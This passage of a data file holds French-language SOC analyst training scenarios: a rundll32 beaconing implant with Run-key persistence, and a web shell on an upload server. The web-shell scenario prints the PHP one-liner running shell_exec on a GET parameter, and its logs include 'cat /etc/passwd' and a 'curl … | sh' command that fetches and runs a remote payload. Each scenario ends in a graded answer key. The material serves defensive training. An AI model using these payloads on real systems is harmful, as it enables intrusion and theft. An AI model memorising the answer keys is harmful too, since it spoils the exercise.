        content: r`date=2026-03-15 time=03:17:05 devname=FW-EDGE01 action=accept policyid=112 srcip=10.40.3.19 srcport=52131 dstip=198.51.100.87 dstport=443 proto=6 service=HTTPS sentbyte=612 rcvdbyte=5543 duration=1
date=2026-03-15 time=03:18:01 devname=FW-EDGE01 action=accept policyid=112 srcip=10.40.3.19 srcport=52144 dstip=198.51.100.87 dstport=443 proto=6 service=HTTPS sentbyte=18244 rcvdbyte=412 duration=2`,
      },
      {
        title: 'Statistiques',
        lang: 'text',
        content: `Hôte : RD-WS-019 | Destination : static-assets-eu.example
Connexions : 2 412 sur 41 h | Intervalle moyen : 61 s | Écart-type : 3,8 s (jitter ~6 %)
Machines de l'entreprise contactant ce domaine sur 90 jours : 1
Session de p.moreau verrouillée depuis vendredi 18:02 UTC`,
      },
      {
        title: 'Sysmon 3 et 1',
        lang: 'log',
        content: r`EventID=3 Image=C:\Windows\System32\rundll32.exe User=CONTOSO\p.moreau DestinationIp=198.51.100.87 DestinationPort=443
EventID=1 UtcTime=2026-03-13 10:21:09 Image=C:\Windows\System32\rundll32.exe CommandLine=rundll32.exe C:\Users\p.moreau\AppData\Roaming\Teams\msvcp_140.dll,Start ParentImage=C:\Windows\System32\wscript.exe
EventID=13 TargetObject=HKU\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Run\TeamsUpdate Details=rundll32.exe C:\Users\p.moreau\AppData\Roaming\Teams\msvcp_140.dll,Start`,
      },
    ],
    tree: {
      name: 'wscript.exe',
      user: 'p.moreau',
      pid: 4120,
      cmd: 'wscript.exe C:\\Users\\p.moreau\\Downloads\\maj_vpn.js',
      flag: 'Script téléchargé',
      children: [{ name: 'rundll32.exe', cmd: 'rundll32.exe …\\Teams\\msvcp_140.dll,Start', pid: 4388, flag: 'DLL non signée, connexions sortantes' }],
    },
    intel: [
      { type: 'Domaine', value: 'static-assets-eu.example', verdict: 'Suspect', detail: 'Créé il y a 11 jours. Ressemble à un CDN. Aucune machine d’entreprise hormis celle-ci.' },
      { type: 'IP', value: '198.51.100.87', verdict: 'Suspect', detail: 'Empreinte JA3 associée dans le TIP à un profil Cobalt Strike.' },
      { type: 'SHA-256', value: '6e12fb04d8a75c39ba18f0627ed4c1a9835bf26d07ae49c1d3b768e502fa91c3', verdict: 'Inconnu', detail: 'msvcp_140.dll : non signé, absent de VirusTotal. Le vrai fichier réside dans System32 et il est signé.' },
    ],
    solution: {
      classification: 'TP',
      tactics: ['Command and Control'],
      actions: ['isolate'],
      partialActions: ['block-c2'],
      reportKeywords: [
        { label: 'Beaconing ou intervalle régulier', anyOf: ['beacon', 'interval', '60 s', '61 s', 'regulier', 'jitter', 'toutes les minutes', 'chaque minute', 'periodique', 'toutes les 60'] },
        { label: 'rundll32 ou DLL', anyOf: ['rundll32', 'msvcp_140'] },
        { label: 'Domaine ou IP', anyOf: ['static-assets-eu', '198.51.100.87'] },
        { label: 'Persistance Run', anyOf: ['cle run', '\\run', 'teamsupdate', 'persistance', 'registre', 'redemarrage', 'demarrage'] },
        { label: 'Session verrouillée ou rareté', anyOf: ['verrouill', 'rare', 'une seule machine', '1 machine', 'seule machine', 'un seul poste', 'unique machine'] },
      ],
      debrief:
        "Plusieurs faibles signaux forment une forte certitude : rythme régulier, session verrouillée, domaine rare, User-Agent IE11 sur un poste récent, rundll32 avec une DLL dans un profil et persistance Run. Isolez l'hôte plutôt que de seulement bloquer le domaine : un implant dispose souvent de domaines de secours, et l'isolement empêche tout pivot.",
      modelReport:
        "Qui : p.moreau, poste RD-WS-019.\nQuoi : beaconing de rundll32.exe (DLL msvcp_140.dll non signée) vers static-assets-eu.example, persistance par clé Run TeamsUpdate, POST de 18 Ko.\nQuand : depuis le 13/03 10:21 UTC, 2 412 connexions sur 41 h.\nOù : RD-WS-019 (10.40.3.19) vers 198.51.100.87:443.\nPourquoi : intervalle 61 s, écart-type 3,8 s, session verrouillée, unique machine concernée, faux jQuery, UA obsolète.\nVerdict : TP. Hôte isolé, mémoire capturée, domaine et IP bloqués, compte réinitialisé, recherche du hash sur le parc.",
      pitfall: "Conclure sur le seul faux air de CDN jQuery. Bloquer seulement le domaine laisse l'implant et sa persistance sur le poste.",
    },
  },
  {
    id: 'ALR-1048',
    title: 'Web shell présumé sur le serveur d’upload',
    severity: 'Critique',
    source: 'Wazuh et auditd',
    rule: 'Web server spawning shell',
    time: '2026-03-16 10:02:03 UTC',
    host: 'web01 (DMZ)',
    user: 'www-data',
    summary: 'Le compte www-data lance sh depuis Apache après la création d’un fichier .php dans /uploads.',
    logs: [
      {
        title: 'Apache access.log',
        lang: 'log',
        content: r`203.0.113.9 - - [16/Mar/2026:10:01:12 +0000] "POST /upload.php HTTP/1.1" 200 412 "https://web01.contoso.example/contact" "Mozilla/5.0"
203.0.113.9 - - [16/Mar/2026:10:01:20 +0000] "GET /uploads/img_442.php?cmd=id HTTP/1.1" 200 54 "-" "python-requests/2.31"
203.0.113.9 - - [16/Mar/2026:10:01:34 +0000] "GET /uploads/img_442.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1877 "-" "python-requests/2.31"
203.0.113.9 - - [16/Mar/2026:10:02:03 +0000] "GET /uploads/img_442.php?cmd=curl+-s+http://203.0.113.9/x|sh HTTP/1.1" 200 12 "-" "python-requests/2.31"`,
      },
      {
        title: 'auditd',
        lang: 'log',
        content: r`type=EXECVE msg=audit(1773655280.112:8841): argc=3 a0="sh" a1="-c" a2="id"
type=EXECVE msg=audit(1773655294.337:8853): argc=3 a0="sh" a1="-c" a2="cat /etc/passwd"
type=EXECVE msg=audit(1773655323.804:8871): argc=3 a0="sh" a1="-c" a2="curl -s http://203.0.113.9/x|sh"
type=SYSCALL msg=audit(1773655323.804:8871): syscall=59 success=yes uid=33 gid=33 comm="sh" exe="/usr/bin/dash"`,
      },
      {
        title: 'Pare-feu DMZ FW-DMZ01',
        lang: 'log',
        content: r`2026-03-16T10:01:12Z FW-DMZ01 ALLOW TCP 203.0.113.9:44120 -> 10.50.1.10:443 rule=internet-to-web01
2026-03-16T10:02:03Z FW-DMZ01 ALLOW TCP 10.50.1.10:48122 -> 203.0.113.9:80 rule=dmz-web-out
2026-03-16T10:02:09Z FW-DMZ01 ALLOW TCP 10.50.1.10:51720 -> 10.30.2.30:1433 rule=web01-to-srv-db03`,
      },
      {
        title: 'Vérification du système de fichiers',
        lang: 'bash',
        content: r`$ ls -la /var/www/html/uploads/img_442.php
-rw-r--r-- 1 www-data www-data 87 Mar 16 10:01 img_442.php
$ cat /var/www/html/uploads/img_442.php
<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>`,
      },
    ],
    tree: {
      name: 'apache2',
      user: 'www-data',
      pid: 1188,
      children: [
        {
          name: 'sh',
          cmd: 'sh -c "curl -s http://203.0.113.9/x|sh"',
          pid: 9921,
          flag: 'Apache lance un shell',
          children: [
            { name: 'curl', cmd: 'curl -s http://203.0.113.9/x', pid: 9922, flag: 'Téléchargement' },
            { name: 'sh', cmd: 'sh', pid: 9923, flag: 'Exécution directe de la charge' },
          ],
        },
      ],
    },
    intel: [
      { type: 'IP', value: '203.0.113.9', verdict: 'Malveillant', detail: 'Signalée pour des exploits automatisés sur des formulaires d’upload.' },
      { type: 'URL', value: '/upload.php', verdict: 'Suspect', detail: 'Aucun filtrage côté serveur sur l’extension du fichier téléversé.' },
      { type: 'Contexte', value: 'web01', verdict: 'Inconnu', detail: 'DMZ. Dispose d’un accès à la base SRV-DB03 sur le port 1433.' },
    ],
    solution: {
      classification: 'TP',
      tactics: ['Persistence', 'Initial Access', 'Execution'],
      actions: ['isolate'],
      partialActions: ['block-c2'],
      reportKeywords: [
        { label: 'Web shell ou fichier PHP', anyOf: ['web shell', 'webshell', 'img_442'] },
        { label: 'www-data ou RCE', anyOf: ['www-data', 'rce', 'uid=33'] },
        { label: 'IP source', anyOf: ['203.0.113.9'] },
        { label: 'Vecteur /upload.php', anyOf: ['upload.php', 'upload'] },
        { label: 'Charge téléchargée', anyOf: ['curl', '|sh', 'telecharg'] },
      ],
      debrief:
        "Le code `200`, le contenu du PHP et les `EXECVE` de `www-data` prouvent l'exécution. La commande `curl | sh` indique une charge supplémentaire. La tactique dominante est la persistance (`T1505.003`), mais l'accès initial et l'exécution sont aussi défendables. Isolez `web01`, car elle a un accès à la base. Conservez le fichier et la mémoire, puis corrigez `/upload.php` avant toute remise en ligne.",
      modelReport:
        "Qui : 203.0.113.9, exécution sous www-data.\nQuoi : upload d'un web shell img_442.php via /upload.php (T1505.003), commandes id, cat /etc/passwd, puis curl -s http://203.0.113.9/x|sh.\nQuand : 10:01:12 à 10:02:03 UTC.\nOù : web01 (DMZ), /var/www/html/uploads.\nPourquoi : script PHP dans un dossier d'upload, 200, python-requests, EXECVE sh uid=33.\nVerdict : TP. Hôte isolé, mémoire et fichier conservés, IP bloquée, recherche d'accès vers SRV-DB03, /upload.php à corriger avant remise en service.",
      pitfall: "Supprimer le fichier en premier détruit une preuve et laisse la charge `x` en place. Ne pas oublier les accès que le serveur possède vers la base de données.",
    },
  },
]
